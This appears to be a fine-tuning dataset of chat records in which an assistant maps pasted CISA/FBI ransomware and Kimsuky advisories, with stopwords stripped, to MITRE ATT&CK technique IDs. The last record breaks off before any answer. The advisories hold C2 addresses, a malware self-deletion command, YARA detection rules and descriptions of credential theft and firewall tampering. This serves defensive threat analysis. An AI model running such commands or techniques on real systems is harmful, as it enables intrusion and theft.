{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory updated include information conti trickbot bazarloader including new iocs yara rules detection advisory uses mitre adversarial tactics techniques common knowledge attck version 7 framework see attck enterprise version 7 referenced threat actor tactics techniques joint cybersecurity advisory coauthored cybersecurity infrastructure security agency cisa federal bureau investigation fbi department health human services hhs advisory describes tactics techniques procedures ttps used cybercriminals targets healthcare public healthhph sectorto infect systems ransomware notably ryuk conti financial gain cisa fbi hhs credible information increased imminent cybercrime threat us hospitals healthcare providers cisa fbi hhs sharing information provide warning healthcare providers ensure take timely reasonable precautions protect networks threats click pdf version report key findings cisa fbi hhs assess malicious cyber actors targeting hph sector trickbot bazarloader malware often leading ransomware attacks data theft disruption healthcare services issues particularly challenging organizations within covid19 pandemic therefore administrators need balance risk determining cybersecurity investments technical details threat details cybercriminal enterprise behind trickbot likely also creator bazarloader malware continued develop new functionality tools increasing ease speed profitability victimization threat actors increasingly use loaderslike trickbot bazarloader bazarbackdooras part malicious cyber campaigns cybercriminals disseminate trickbot bazarloader via phishing campaigns contain either links malicious websites host malware attachments malware loaders start infection chain distributing payload deploy execute backdoor command control c2 server install victims machine trickbot began banking trojan descendant dyre malware trickbot provides operators full suite tools conduct myriad illegal cyber activities activities include credential harvesting mail exfiltration cryptomining pointofsale data exfiltration deployment ransomware ryuk conti early 2019 fbi began observe new trickbot modules named anchor cyber actors typically used attacks targeting highprofile victimssuch large corporations attacks often involved data exfiltration networks pointofsale devices part new anchor toolset trickbot developers created anchordns tool sending receiving data victim machines using domain name system dns tunneling anchordns backdoor allows victim machines communicate c2servers dns evade typical network defense products make malicious communications blend legitimate dns traffic anchordns uses singlebyte xor cipher encrypt communications observed using key 0xb9 decrypted string anchordns found dns request traffic trickbot indicators compromise successful execution malware trickbot copies executable file 12characterrandomly generated file name eg mfjdieksexe places file one following directories cwindows cwindowssyswow64 cusersusernameappdataroaming executable running successful establishing communication c2s executable places appropriate modules downloaded c2s infected processor architecture type 32 64 bit instruction set infected hosts appdata programdata directory appdataroamingwinapp commonly named plugins created modules subdirectory detected architecture appended module filename eg importdll32 importdll64 systeminfo importdll outlookdll injectdll directory ex injectdll64configs containing configuration files dinj sinj dpost mailsearcher directory ex mailsearcher64configs containing configuration file mailconf networkdll directory ex networkdll64configs containing configuration file dpost wormdll tabdll sharedll filename clientid data faq assigned bot id compromised system created malware directory filename grouptag readmemd containing trickbot campaign ids created malware directory malware may also drop file named anchordiagtxt one directories listed part initial network communications c2 server involves sending information victim machine computer namehostname operating system version build via base64encoded guid guid composed groupidclientid following naming convention anchordnscomputernamewindowsversionbuildno32characterstring malware uses scheduled tasks run every 15 minutes ensure persistence victim machine scheduled task typically uses following naming conventionrandomfoldernameinappdataexcludingmicrosoft autoupdate5randomnumbers eg task autoupdate16876 successful execution anchordns deploys malicious batch scripts bat using powershell commands malware deploys selfdeletion techniques executing following commands cmdexe c timeout 3 del cusersusernamemalwaresample cmdexe c powershell startsleep 3 removeitem cusersusernamemalwaresamplelocation following domains found outbound dns records associated anchordns kostunivocom chishircom mangoclonecom onixcellentcom malware used following legitimate domains test internet connectivity ipechonet apiipifyorg checkipamazonawscom ipanysrcnet wtfismyipcom ipinfoio icanhazipcom myexternalipcom identme currently opensource tracker trickbot c2 servers located httpsfeodotrackerabusechbrowsetrickbot anchordns malware historically used following c2 servers 23959759 5125425115 1931839866 9121713737 879817585 trickbot yara rules rule anchordnsstringsfilenames meta description rule detect anchordns samples based strings filenames used malware author ncsc hash1 fc0efd612ad528795472e99cae5944b68b8e26dc hash2 794eb3a9ce8b7e5092bb1b93341a54097f5b78a9 hash3 9dfce70fded4f3bc2aa50ca772b0f9094b7b1fb2 hash4 24d4bbc982a6a561f0426a683b9617de1a96a74a strings controlrundll x00 guid ascii wide data ascii wide 1001 x00xccqwertyuiopasdfghjklzxcvbnmx00xcc x00xccqwertyuiopasdfghjklzxcvbnmx00xcc start program cmdline globalfde345tyhovgyhujkiouy chardworkerthexecute error registry get command incode cmdid cmd anchordns anchorx86 anchorx64 condition uint160 0x5a4d uint16uint320x3c 0x4550 3 rule anchordnsicmptransport meta description rule detect anchordns samples based icmp transport strings author ncsc hash1 056f326d9ab960ed02356b34a6dcd72d7180fc83 strings resetconnection serverok packets server erase successfully transmitted packet count packet sended crc send data confimation servers data recived rearmost packed recived id send poll server condition uint160 0x5a4d uint16uint320x3c 0x4550 3 rule anchordnsconfigdexor meta description rule detect anchordns samples based configuration deobfuscation xor 0x23 countup author ncsc hash1 d0278ec015e10ada000915a1943ddbb3a0b6b3db hash2 056f326d9ab960ed02356b34a6dcd72d7180fc83 strings x86 75 1f 56 6a 40 b2 23 33 c9 5e 8a 81 32 c2 fe c2 88 81 41 83 ee 01 75 ea 5e b8 c3 x64 41 b0 23 41 b9 80 00 00 00 8a 84 3a 00 41 32 c0 41 fe c0 88 04 32 48 ff c2 49 83 e9 01 75 e7 condition uint160 0x5a4d uint16uint320x3c 0x4550 rule anchordnsinstaller meta description rule detect anchordns installer samples based mz magic onetime pad deobfuscation loop code author ncsc hash1 fa98074dc18ad7e2d357b5d168c00a91256d87d1 hash2 78f0737d2b1e605aad62af252b246ef390521f02 strings pre 43 00 4f 00 4e 00 4f 00 55 00 54 00 24 00 00 00 conout pst 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 00 00 kernel32dll deobx86 8b c8 89 4d f8 83 f9 ff 74 52 46 89 5d f4 88 5d ff 85 f6 74 34 8a 83 32 83 6a 00 88 45 ff 8d 45 f4 50 6a 01 8d 45 ff 50 51 ff 15 34 80 41 00 8b 4d f8 43 8b f0 81 fb 00 72 cc 85 f6 75 08 deobx64 42 0f b6 84 3f 4c 8d 8c 24 80 00 00 00 42 32 84 3f 48 8d 54 24 78 41 b8 01 00 00 00 88 44 24 78 48 8b ce 48 89 6c 24 20 ff 15 48 ff c7 8b d8 48 81 ff 72 b8 condition uint160 0x5a4d uint16uint320x3c 0x4550 uint16pre16 uint16pre16pstpre162 0x5a4d deobx86 deobx64 import pe rule anchordnsstring1001withpesectiondllexportresolveipdomains meta description rule detect anchordns samples based 1001 string combination dll export name string pe section addr ip resolution domains author ncsc hash1 ff8237252d53200c132dd742edc77a6c67565eee hash2 c8299aadf886da55cb47e5cbafe8c5a482b47fc8 strings str1001 2f 31 30 30 31 2f 00 1001 strctrl 2c 43 6f 6e 74 72 6f 6c 5f 52 75 6e 44 4c 4c 20 00 controlrundll ip1 checkipamazonawscom ascii wide ip2 ipechonet ascii wide ip3 ipinfoio ascii wide ip4 apiipifyorg ascii wide ip5 icanhazipcom ascii wide ip6 myexternalipcom ascii wide ip7 wtfismyipcom ascii wide ip8 ipanysrcnet ascii wide condition uint160 0x5a4d uint16uint320x3c 0x4550 str1001 0penumberofsections pesectionsiname addr strctrl 6 ip rule anchordnscheckrandomstringindnsresponse meta description rule detect anchordns samples based checking random string dns response author ncsc hash1 056f326d9ab960ed02356b34a6dcd72d7180fc83 hash2 14e9d68bba7a184863667c680a8d5a757149aa36 strings x86 8a d8 83 c4 10 84 db 75 08 8b 7d bc e9 84 00 00 00 8b 7d bc 32 db 8b c7 33 f6 0f 1f 00 85 c0 74 71 40 6a 2f 50 e8 46 83 c4 08 83 fe 03 72 ea 85 c0 74 5b 83 7d d4 10 8d 4d c0 8b 75 d0 8d 50 01 0f 43 4d c0 83 ee 04 72 11 8b 02 3b 01 75 10 83 c2 04 83 c1 04 83 ee 04 73 ef 83 fe fc 74 2d 8a 02 3a 01 75 29 83 fe fd 74 22 8a 42 01 3a 41 01 75 1c 83 fe fe 74 15 8a 42 02 3a 41 02 75 0f 83 fe ff 74 08 8a 42 03 3a 41 03 75 02 b3 01 8b 75 b8 x64 4c 39 75 ef 74 56 48 8d 45 df 48 83 7d f7 10 48 0f 43 45 df 49 8b fe 48 85 c0 74 40 48 8d 48 01 ba 2f 00 00 00 e8 49 03 ff 48 83 ff 03 72 e4 48 85 c0 74 24 48 8d 55 1f 48 83 7d 37 10 48 0f 43 55 1f 48 8d 48 01 4c 8b 45 2f e8 0f b6 db 85 c0 41 0f 44 df 49 03 f7 48 8b 55 f7 48 83 fe 05 0f 82 6a ff ff ff condition uint160 0x5a4d uint16uint320x3c 0x4550 rule anchordnsdefaultresultexecutecommand meta description rule detect anchordns samples based default result value executing command author ncsc hash1 056f326d9ab960ed02356b34a6dcd72d7180fc83 hash2 14e9d68bba7a184863667c680a8d5a757149aa36 strings x86 83 c4 04 3d 80 00 00 00 73 15 8b 04 85 85 c0 74 0a 8d 4d d8 51 8b cf ff d0 8a d8 84 db c7 45 a4 0f 00 00 00 x64 48 98 b9 e7 03 00 00 48 3d 80 00 00 00 73 1b 48 8d 15 48 8b 04 c2 48 85 c0 74 0b 48 8d 55 90 48 8b ce ff d0 8b c8 condition uint160 0x5a4d uint16uint320x3c 0x4550 rule anchordnspdbs meta description rule detect anchordns samples based partial pdb paths author ncsc hash1 f0e575475f33600aede6a1b9a5c14f671cb93b7b hash2 1304372bd4cdd877778621aea715f45face93d68 hash3 e5dc7c8bfa285b61dda1618f0ade9c256be75d1a hash4 f96613ac6687f5dbbed13c727fa5d427e94d6128 hash5 46750d34a3a11dd16727dc622d127717beda4fa2 strings myprojectssecondworkanchor simsimanchordns jobanchor anchorwin32releaseanchor usersprofidesktopdatawin32anchor condition uint160 0x5a4d uint16uint320x3c 0x4550 bazarloaderbazarbackdoor beginning approximately early 2020 actors believed associated trickbot began using bazarloader bazarbackdoor infect victim networks loader backdoor work closely together achieve infection communicate c2 infrastructure campaigns using bazar represent new technique cybercriminals infect monetize networks increasingly led deployment ransomware including ryuk bazarloader become one commonly used vectors ransomware deployment deployment bazarloader malware typically comes phishing email contains following phishing emails typically delivered commercial mass email delivery services email received victim contain link actorcontrolled google drive document free online filehosting solutions typically purporting pdf file document usually references failure create preview document contains link url hosting malware payload form misnamed multiple extension file emails appear routine legitimate business correspondence customer complaints hiring decision important tasks require attention recipient email communications included recipients name employer name subject line andor email body phishing emails linking users google documents actors used identified file names install bazarloader reportreview2610exe reviewreport1510exe documentprintexe report1013exe textreportexe bazar activity identified searching system startup folders userinit values hklmsoftwaremicrosoftwindows ntcurrentversionwinlogon registry key appdatamicrosoftwindowsstart menuprogramsstartupadobelnk comprehensive list indicators compromise regarding bazarlocker malware see httpswwwfireeyecomblogthreatresearch202010kegtapandsinglemaltwitharansomwarechaserhtml indicators addition trickbot bazarloader threat actors using malware kegtap beerbot singlemalt others continue change tactics techniques procedures highly dynamic campaign following c2 servers known associated malicious activity 451481092 170238117187 17774232124 185689317 203176135102 9697373 96977142 371873176 458912792 6210835103 91200103242 103842383 368910669 10376169213 369187227 1051631783 18511773163 5278118 185906169 185906162 8610419430 3113121184 4628648 10416132111 107172140171 13115322148 195123240219 195123242119 195123242120 518111325 742221427 ryuk ransomware typically ryuk deployed payload banking trojans trickbot see united kingdom uk national cyber security centre ncsc advisory ryuk ransomware targeting organisations globally ongoing investigation global ryuk ransomware campaigns associated emotet trickbot malware ryuk first appeared august 2018 derivative hermes 21 ransomware first emerged late 2017 available sale open market august 2018 ryuk still retains aspects hermes code example files encrypted ryuk contain hermes tag infections files ryk added filename others parts ransomware code ryuk removed replaced features hermes restriction targeting specific eurasiabased systems negotiating victim network ryuk actors commonly use commercial offtheshelf productssuch cobalt strike powershell empirein order steal credentials frameworks robust highly effective dualpurpose tools allowing actors dump clear text passwords hash values memory use mimikatz allows actors inject malicious dynamiclink library memory read write execute permissions order maintain persistence victim environment ryuk actors known use scheduled tasks service creation ryuk actors quickly map network order enumerate environment understand scope infection order limit suspicious activity possible detection actors choose live land possible use native toolssuch net view net computers pingto locate mapped network shares domain controllers active directory order move laterally throughout network group relies native tools powershell windows management instrumentation wmi windows remote management remote desktop protocol rdp group also uses thirdparty tools bloodhound dropped ryuk uses aes256 encrypt files rsa public key encrypt aes key ryuk dropper drops bat file attempts delete backup files volume shadow copies automatic backup snapshots made windows preventing victim recovering encrypted files without decryption program addition attackers attempt shut uninstall security applications victim systems might prevent ransomware executing normally done via script fails attackers capable manually removing applications could stop attack ryukreadme file placed system encryption provides either one two email addresses using endtoend encrypted email provider protonmail victim contact attackers earlier versions provide ransom amount initial notifications ryuk users designating ransom amount victim makes contact victim told much pay specified bitcoin wallet decryptor provided sample decryption two files initial testing indicates ryukreadme file need present decryption script run successfully reporting advises files decrypt properly without even run correctly guarantee decryptor effective complicated ryukreadme file deleted script finished may affect decryption script unless saved stored different location running according mitre ryuk uses attck techniques listed table 1 table 1 ryuk attck techniques mitigations downloadable copy iocs see aa20302astix additional iocs detailing activity see httpsgistgithubcomaaronst6aa7f61246f53a8dd4befea86e832456 plans policies cisa fbi hhs encourage hph sector organizations maintain business continuity plansthe practice executing essential functions emergencies eg cyberattacksto minimize service interruptions without planning provision implementation continuity principles organizations may unable continue operations evaluating continuity capability help identify continuity gaps identifying addressing gaps organizations establish viable continuity program help keep functioning cyberattacks emergencies cisa fbi hhs suggest hph sector organizations review establish patching plans security policies user agreements business continuity plans ensure address current threats posed malicious cyber actors network best practices patch operating systems software firmware soon manufacturers release updates check configurations every operating system version hph organizationowned assets prevent issues arising local users unable fix due local administration disabled regularly change passwords network systems accounts avoid reusing passwords different accounts use multifactor authentication possible disable unused remote accessremote desktop protocol rdp ports monitor remote accessrdp logs implement application remote access allow listing allow systems execute programs known permitted established security policy audit user accounts administrative privileges configure access controls least privilege mind audit logs ensure new accounts legitimate scan open listening ports mediate needed identify critical assets patient database servers medical records teleheatlh telework infrastructure create backups systems house backups offline network implement network segmentation sensitive data reside server network segment email environment set antivirus antimalware solutions automatically update conduct regular scans ransomware best practices cisa fbi hhs recommend paying ransoms payment guarantee files recovered may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities addition implementing network best practices fbi cisa hhs also recommend following regularly back data air gap password protect backup copies offline implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate secure location user awareness best practices focus awareness training end users targeted make employees stakeholders aware threatssuch ransomware phishing scamsand delivered additionally provide users training information security principles techniques well overall emerging cybersecurity risks vulnerabilities ensure employees know contact see suspicious activity believe victim cyberattack ensure proper established mitigation strategy employed quickly efficiently recommended mitigation measures system administrators indicators trickbot network compromise immediately take steps back secure sensitive proprietary data trickbot infections may indicators imminent ransomware attack system administrators take steps secure network devices accordingly upon evidence trickbot infection review dns logs use xor key 0xb9 decode xor encoded dns requests reveal presence anchordns maintain provide relevant logs general ransomware mitigations hph sector section based cisa multistate information sharing analysis center msisacs joint ransomware guide found httpswwwcisagovpublicationransomwareguide cisa fbi hhs recommend healthcare organizations implement ransomware prevention ransomware response measures immediately ransomware prevention join engage cybersecurity organizations cisa fbi hhs recommend healthcare organizations take following initial steps join healthcare information sharing organization hisac health information sharing analysis center hisac httpshisacorgmembershipaccountjoinhisac sectorbased isacs national council isacs httpswwwnationalisacsorgmemberisacs information sharing analysis organization isao standards organization httpswwwisaoorginformationsharinggroups engage cisa fbi well hhsthrough hhs health sector cybersecurity coordination center hc3to build lasting partnership collaborate information sharing best practices assessments exercises cisa cisagov httpsuscertcisagovmailinglistsandfeeds centralcisagov fbi ic3gov wwwfbigovcontactusfield cywatchfbigov hhshc3 httpwwwhhsgovhc3 hc3hhsgov engaging hisac isao cisa fbi hhshc3 enable organization receive critical information access services better manage risk posed ransomware cyber threats follow ransomware best practices refer best practices references help manage risk posed ransomware support organizations coordinated efficient response ransomware incident apply practices greatest extent possible based availability organizational resources critical maintain offline encrypted backups data regularly test backups backup procedures conducted regular basis important backups maintained offline separated networks many ransomware variants attempt find delete accessible backups maintaining offline current backups critical need pay ransom data readily accessible organization use 321 rule guideline backup practices rule states three copies critical data retained least two different types media least one stored offline maintain regularly updated gold images critical systems event need rebuilt entails maintaining image templates include preconfigured operating system os associated software applications quickly deployed rebuild system virtual machine server retain backup hardware rebuild systems event rebuilding primary system preferred hardware newer older primary system present installation compatibility hurdles rebuilding images ensure backup hardware properly patched addition system images applicable source code executables available stored backups escrowed license agreement obtain etc efficient rebuild system images images install different hardware platforms correctly separate access needed software help cases create maintain exercise basic cyber incident response plan associated communications plan includes response notification procedures ransomware incident review available incident response guidance cisas technical approaches uncovering remediating malicious activityhttpsuscertcisagovncasalertsaa20245a help organization better organize around cyber incident response develop cyber incident response plan ransomware response checklist available cisa msisac joint ransomware guide serves adaptable ransomware specific annex organizational cyber incident response disruption plans review implement applicable mitres medical device cybersecurity regional incident preparedness response playbook httpswwwmitreorgsitesdefaultfilespublicationspr181550medicaldevicecybersecurityplaybookpdf develop risk management plan maps critical health services care necessary information systems ensure incident response plan contain proper triage procedures plan possibility critical information systems inaccessible extended period time include limited following print properly storeprotect hard copies digital information would required critical patient healthcare plan periodically train staff handle rerouting incomingexisting patients expedient manner information systems abruptly unexpectedly become unavailable coordinate potential surge support healthcare facilities greater local area include organizational leadership periodically meeting collaborating counterparts greater local area createupdate plans facilities abruptly send receive significant amount critical patients immediate care may include opportunity reroute healthcare employees possibly equipment provide care along additional patients consider development second airgapped communications network provide minimum standard backup support hospital operations primary network becomes unavailable ifwhen needed predefine network segments capabilities functionality either quickly separated greater network shut entirely without impacting operations rest infrastructure legacy devices identified inventoried highest priority given special consideration ransomware event see cisa msisacs joint ransomware guide infection vectors including internetfacing vulnerabilities misconfigurations phishing precursor malware infection third parties managed service providers hhshc3 tracks ransomware targeting hph sector information found httpwwwhhsgovhc3 hardening guidance food drug administration provides multiple guidance documents regarding hardening healthcare specifically medical devices found httpswwwfdagovmedicaldevicesdigitalhealthcenterexcellencecybersecurity see cisa msisacs joint ransomware guide additional indepth hardening guidance contact cisa nocost resources information sharing cisa msisac sltt organizations includes bidirectional sharing best practices network defense information regarding ransomware trends variants well malware precursor ransomware policyoriented technical assessments help organizations understand improve defenses avoid ransomware infection httpswwwcisagovcyberresourcehub assessments include vulnerability scanning phishing campaign assessment cyber exercises evaluate help develop cyber incident response plan context ransomware incident scenario cisa cybersecurity advisors csas advise best practices connect cisa resources manage cyber risk contacts sltt organizations cyberliaisonslttcisadhsgov private sector organizations cyberliaisonindustrycisadhsgov ransomware quick references ransomware cisa general ransomware guidance organizational leadership indepth information cisos technical staff httpswwwuscertcisagovsitesdefaultfilespublicationsransomwareexecutiveonepagerandtechnical documentfinalpdf ransomware cisa introduction ransomware notable links cisa products protecting networks specific ransomware threats resources httpswwwuscertcisagovransomware hhshc3 ransomware impacts hph tracked hc3 found wwwhhsgovhc3 security primer ransomware msisac outlines opportunistic strategic ransomware campaigns common infection vectors best practice recommendations httpswwwcisecurityorgwhitepaperssecurityprimerransomware ransomware facts threats countermeasures ms isac facts ransomware infection vectors ransomware capabilities mitigate risk ransomware infection httpswwwcisecurityorgblogransomware factsthreatsandcountermeasures hhs ransomware fact sheet httpswwwhhsgovsitesdefaultfilesransomwarefactsheetpdf nist securing data integrity white paper httpscsrcnistgovpublicationsdetailwhitepaper20201001securingdataintegrityagainstransomwareattacksdraft ransomware response checklist remember paying ransom ensure data decrypted systems data longer compromised cisa fbi hhs recommend paying ransom organization victim ransomware cisa strongly recommends responding using ransomware response checklist located cisa msisacs joint ransomware guide contains steps detection analysis well containment eradication consider need extended identification analysis extended identification analysis needed cisa hhshc3 federal law enforcement may interested following information organization determines legally share recovered executable file copies readme file remove file decryption may possible live memory ram capture systems additional signs compromise use exploit toolkits rdp activity additional files found locally images infected systems additional signs compromise use exploit toolkits rdp activity additional files found locally malware samples names malware identified system encrypted file samples log files windows event logs compromised systems firewall logs etc powershell scripts found executed systems user accounts created active directory machines added network exploitation email addresses used attackers associated phishing emails copy ransom note ransom amount whether ransom paid bitcoin wallets used attackers bitcoin wallets used pay ransom applicable copies communications attackers upon voluntary request cisa assist analysis eg phishing emails storage media logs malware cost support organization understanding root cause incident even event additional remote assistance requested cisa advanced malware analysis center httpswwwmalwareuscertgovmalwaresubmissionpagessubmissionjsf remote assistance request via centralcisagov contact information cisa fbi hhs recommend identifying hand following contact information ready use organization become victim ransomware incident consider contacting organizations mitigation response assistance purpose notification state local response contacts itit security team centralized cyber incident reporting state local law enforcement fusion center managedsecurity service providers cyber insurance report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisagov additionally see cisa msisacs joint ransomware guide information contactingand expect contactingfederal asset response federal threat response contacts disclaimer document marked tlpwhite disclosure limited sources may use tlpwhite information carries minimal foreseeable risk misuse accordance applicable rules procedures public release subject standard copyright rules tlpwhite information may distributed without restriction information traffic light protocol see httpscisagovtlp references cisa emergency services sector continuity planning suite cisa msisac joint ransomware guide cisa tip avoiding social engineering phishing attacks fbi psa highimpact ransomware attacks threaten us businesses organizations health industry cybersecurity tactical crisis response health industry cybersecurity practices hicp hhs ransomware spotlight webinar hhs health industry cybersecurity practices managing threats protecting patients hhs ransomware briefing hhs aggressive ransomware impacts hhs ransomware fact sheet hhs cyber attack checklist hhs cyberattack response infographic nist data integrity publication nist guide cybersecurity event recovery nist identifying protecting assets ransomware destructive events nist detecting responding ransomware destructive events nist recovering ransomware destructive events github list iocs revisions october 28 2020 initial versionoctober 29 2020 updated include information conti trickbot bazarloader including new iocs yara rules detectionnovember 2 2020 updated fbi link product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1016, T1036.005, T1055, T1057, T1059.003, T1083, T1106, T1134, T1486, T1489, T1490, T1562.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck version 7 framework see attck enterprise version 7 referenced threat actor tactics techniques joint cybersecurity advisory coauthored cybersecurity infrastructure security agency cisa federal bureau investigation fbi us cyber command cyber national mission force cnmf advisory describes tactics techniques procedures ttps used north korean advanced persistent threat apt group kimsukyagainst worldwide targetsto gain intelligence various topics interest north korean government us government refers malicious cyber activity north korean government hidden cobra information hidden cobra activity visit httpswwwuscertcisagovnorthkorea advisory describes known kimsuky ttps found opensource intelligence reporting july 2020 target audience advisory commercial sector businesses desiring protect networks north korean apt activity click pdf version report key findings advisorys key findings kimsuky apt group likely operating since 2012 kimsuky likely tasked north korean regime global intelligence gathering mission kimsuky employs common social engineering tactics spearphishing watering hole attacks exfiltrate desired information victims12 kimsuky likely use spearphishing gain initial access victim hosts networks3 kimsuky conducts intelligence collection activities individuals organizations south korea japan united states kimsuky focuses intelligence collection activities foreign policy national security issues related korean peninsula nuclear policy sanctions kimsuky specifically targets individuals identified experts various fields think tanks south korean government entities45678 cisa fbi cnmf recommend individuals organizations within target profile increase defenses adopt heightened state awareness particularly important mitigations include safeguards spearphishing use multifactor authentication user awareness training technical details initial access kimsuky uses various spearphishing social engineering methods obtain initial access victim networks91011 spearphishingwith malicious attachment embedded emailis observed kimsuky tactic phishing spearphishing attachment1213 apt group used web hosting credentialsstolen victims outside usual targetsto host malicious scripts tools kimsuky likely obtained credentials victims via spearphishing credential harvesting scripts victim domains created subdomains mimicking legitimate sites services spoofing google yahoo mail14 kimsuky also sent benign emails targets possibly intended build trust advance followon email malicious attachment link posing south korean reporters kimsuky exchanged several benign interviewthemed emails intended target ostensibly arrange interview date possibly build rapport emails contained subject line skype interview requests ofredacted tv show seoul began request recipient appear guest show apt group invited targets skype interview topic interkorean issues denuclearization negotiations korean peninsula recipient agreed interview kimsuky sent subsequent email malicious document either attachment google drive link within body document usually contained variant babyshark malware see execution section information babyshark date interview drew near kimsuky sent email canceling interview kimsuky tailors spearphishing social engineering approaches use topics relevant target covid19 north korean nuclear program media interviews151617 kimsukys methods obtaining initial access include loginsecurityalertthemed phishing emails watering hole attacks distributing malware torrent sharing sites directing victims install malicious browser extensions phishing spearphising link driveby compromise maninthebrowser18 execution obtaining initial access kimsuky uses babyshark malware powershell windows command shell execution babyshark visual basic script vbsbased malware first compromised host system uses native microsoft windows utility mshtaexe download execute html application hta file remote system signed binary proxy execution mshta hta file downloads decodes executes encoded babyshark vbs file script maintains persistence creating registry key runs startup boot logon autostart execution registry run keys startup folder collects system information system information discovery sends operators command control c2 servers awaits commands19202122 opensource reporting indicates babyshark delivered via email message containing link attachment see initial access section information phishing spearphising link phishing spearphishing attachment kimsuky tailors email phishing messages match targets interests observed targets us think tanks global cryptocurrency industry23 kimsuky uses powershell run executables internet without touching physical hard disk computer using targets memory command scripting interpreter powershell powershell commandsscripts executed without invoking powershellexe hta files mshtaexe24252627 persistence kimsuky demonstrated ability establish persistence using malicious browser extensions modifying system processes manipulating autostart execution using remote desktop protocol rdp changing default file association application using methods kimsuky gain login password information andor launch malware outside application allowlisting solutions 2018 kimsuky used extension available google chrome web store infect victims steal passwords cookies browsers maninthebrowser extensions reviews gave fivestar rating however text reviews applied extensions negative reviews likely left compromised google accounts28 kimsuky may install new service execute startup using utilities interact services directly modifying registry keys boot logon autostart execution service name may disguised name related operating system function masquerading benign software services may created administrator privileges executed system privileges adversary also use service escalate privileges administrator system also directly start services service execution2930 stolen pencil operation may 2018 kimsuky used grease malware grease tool capable adding windows administrator account enabling rdp avoiding firewall rules remote services remote desktop protocol31 kimsuky uses document stealer module changes default program associated hangul word processor hwp documents hwp files registry event triggered execution change default file association kimsuky manipulates default registry setting open malicious program instead legitimate hwp program hwp korean word processor malware read email content hwp documents legitimate hwp program ultimately opens document32 kimsuky also targets microsoft office users formatting documents docx file rather hwp tailor macros accordingly33 kimsuky maintains access compromised domains uploading actormodified versions opensource hypertext processor phpbased web shells web shells enable apt actor upload download delete files directories compromised domains server software component web shell actor often adds dinosaur references within modified web shell codes34 privilege escalation kimsuky uses wellknown methods privilege escalation methods include placing scripts startup folder creating running new services changing default file associations injecting malicious code explorerexe kimsuky used win7elevatean exploit metasploit frameworkto bypass user account control inject malicious code explorerexe process injection malicious code decrypts spying librarya collection keystroke logging remote control access tools remote control download execution toolsfrom resources regardless victims operating system saves decrypted file disk random hardcoded name eg dfe8b437dd7c417a6dtmp users temporary folder loads file library ensuring tools system even reboot allows escalation privileges35 injection takes place malware sets necessary privileges see figure 1 malware writes path malicious dynamic link library dll ensures remote process loaded creating remote thread within explorerexe process injection36 figure 1 privileges set injection37 defense evasion kimsuky uses wellknown widely available methods defense evasion within network methods include disabling security tools deleting files using metasploit3839 kimsukys malicious dll runs startup zero ie turn windows firewall registry keys see figure 2 disables windows system firewall turns windows security center service prevents service alerting user disabled firewall see figure 2 impair defenses disable modify system firewall40 figure 2 disabled firewall values registry41 kimsuky used keylogger deletes exfiltrated data disk transmitted c2 server indicator removal host file deletion42 kimsuky used mshtaexe utility executes microsoft htas used proxy execution malicious hta files javascript vbs trusted windows utility signed binary proxy execution mshta also used bypass application allow listing solutions abuse elevation control mechanism bypass user access control4344 win7elevatewhich noted aboveis also used evade traditional security measures win7elevatve part metasploit framework opensource code used inject malicious code explorerexe process injection malicious code decrypts spying library resources saves decrypted file disk random hardcoded name victims temporary folder loads file library454647 credential access kimsuky uses legitimate tools network sniffers harvest credentials web browsers files keyloggers credential access kimsuky uses memory dump programs instead using wellknown malicious software performs credential extraction offline kimsuky uses procdump windows command line administration tool also available linux allows user create crash dumpscore dumps processes based upon certain criteria high central processing unit cpu utilization os credential dumping procdump monitors cpu spikes generates crash dump value met passes information word document saved computer used general process dump utility actors embed scripts seen kimsukys inclusion procdump babyshark malware48 according opensource security researchers kimsuky abuses chrome extension steal passwords cookies browsers maninthebrowser4950 spearphishing email directs victim phishing site victim shown benign pdf document able view victim redirected official chrome web store page install chrome extension ability steal cookies site passwords loads javascript file named jqueryjs separate site see figure 351 figure 3 javascript file named jqueryjs52 kimsuky also uses powershell based keylogger named mechanical network sniffing tool named nirsoft sniffpass input capture keylogging network sniffing mechanical logs keystrokes userprofileappdataroamingapachtxtlog also cryptojacker tool uses victims computer mine cryptocurrency nirsoft sniffpass capable obtaining passwords sent nonsecure protocols53 kimsuky used actormodified versions phproxy opensource web proxy written php examine web traffic victim website accessed victims collect credentials entered victim54 discovery kimsuky enumerates system information file structure victims computers networks discovery kimsuky appears rely using victims operating system command prompt enumerate file structure system information file directory discovery information directed cwindowsmsdatl3inc read malware likely emailed malwares command server55 collection kimsuky collects data victim system hwp document malware keylogger collection hwp document malware changes default program association registry open hwp documents event triggered execution change default file association user opens hwp file registry key change triggers execution malware opens hwp document sends copy hwp document account adversarys control malware allows user open file normal without indication user anything occurred keylogger intercepts keystrokes writes cprogram filescommon filessystemole dbmsolui80inc records active window name user pressed keys input capture keylogging another keylogger variant logs keystrokes cwindowssetuplog56 kimsuky also used mac os python implant gathers data mac os systems sends c2 server command scripting interpreter python python program downloads various implants based c2 options specified filedownphp see figure 4 figure 4 python script targeting macos57 command control kimsuky used modified teamviewer client version 509104 command control remote access software initial infection service remote access service created adjusted execute cwindowssystem32vcmonexe system startup boot logon autostart execution registry run keys startup folder every time vcmonexe executed disables firewall zeroing registry values impair defenses disable modify system firewall program modifies teamviewer registry settings changing teamviewer strings teamviewer components launcher configures several registry values including securitypasswordaes control remote access tool work securitypasswordaes registry value represents hash password used remote user connect teamviewer client use alternate authentication material pass hash way attackers set preshared authentication value access teamviewer client attacker execute teamviewer client netsvcsexe58 kimsuky using consistent format url used recentlyexpressphpop1there appears option range 1 359 exfiltration opensource reporting cybersecurity companies describes two different methods kimsuky used exfiltrate stolen data via email rc4 key generated md5 hash randomly generated 117bytes buffer exfiltration indication actor destroyed computers observed exfiltrations suggesting kimsukys intention steal information disrupt computer networks kimsukys preferred method sending receiving exfiltrated 